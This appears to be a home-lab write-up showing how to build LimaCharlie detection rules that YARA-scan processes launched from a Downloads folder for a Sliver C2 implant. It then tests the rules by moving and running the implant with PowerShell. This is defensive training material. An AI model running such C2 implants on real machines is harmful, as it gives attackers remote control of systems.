![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/0ab6b50e-1794-4351-93a6-eb6db5f79195)

#### Automatically YARA scan processes launched from Downloads directory

Browse to “Automation” > “D&R Rules” and create a new rule with the below in te 'Detect' block

This rule is matching any process that is launched from a user Downloads directory

```
event: NEW_PROCESS
op: and
rules:
  - op: starts with
    path: event/FILE_PATH
    value: C:\Users\
  - op: contains
    path: event/FILE_PATH
    value: \Downloads\
```

And the below in the 'Respond' block

Notice in this rule, we’re no longer scanning the FILE_PATH, but the actual running process by specifying its PROCESS_ID. We are also now using the other YARA rule we created, sliver-process

```
- action: report
  name: Execution from Downloads directory
- action: task
  command: yara_scan hive://yara/sliver-process --pid "{{ .event.PROCESS_ID }}"
  investigation: Yara Scan Process
  suppression:
    is_global: false
    keys:
      - '{{ .event.PROCESS_ID }}'
      - Yara Scan Process
    max_count: 1
    period: 1m
```

And were going to save this rule as 'YARA Scan Process Launched from Downloads'

####Let’s trigger our new rules!

To make things easier, we won’t re-download our Sliver payload, but we’ll simulate this activity by moving it to another location, then putting it back into C:\Users\User\Downloads

To start i will open up Powershell as Administrator from the desktop and run the commands
1st to change to the Downloads directory
2nd to move the payload to the Documents folder
3rd to put the payload back into the downloads folder

```
cd ~\Downloads
Move-Item .\ELECTRIC_INEVITABLE.exe ..\Documents\
Move-Item ..\Documents\ELECTRIC_INEVITABLE.exe .\
```

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/2a9b3184-bdb6-4d32-ab33-6d6cab2522bf)

Lets go back over to LimaCharlie and check out the detections and We should see an initial alert for EXE dropped in Downloads directory followed shortly by a YARA detection once the scan kicked off and found Sliver inside the EXE

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/e3aff106-1cb1-45a0-8861-1fca961d2c1b)

####Scanning processes launched from Downloads

Let’s now test our new D&R rule which scans all processes launched from the Downloads directory for the presence of Sliver C2.

We need to open up and administrative Powershell prompt

First, let’s kill any existing instances of our Sliver C2 from previous labs

```
Get-Process ELECTRIC_INEVITABLE | Stop-Process
```

Now from the Administrative PowerShell session, execute the Sliver payload to create the NEW_PROCESS event we need to trigger the scanning of a process launched from the Downloads directory

```
C:\Users\sywtbsa\Downloads\ELECTRIC_INEVITABLE.exe
```

Lets go back to LimaCharlie and check out the detections again and we can see an initial alert for Execution from Downloads directory

![image](https://github.com/Matt4llan/SYWTBASA-Lab/assets/156334555/e562f22c-afde-48e4-9a07-e342d26ea3af)


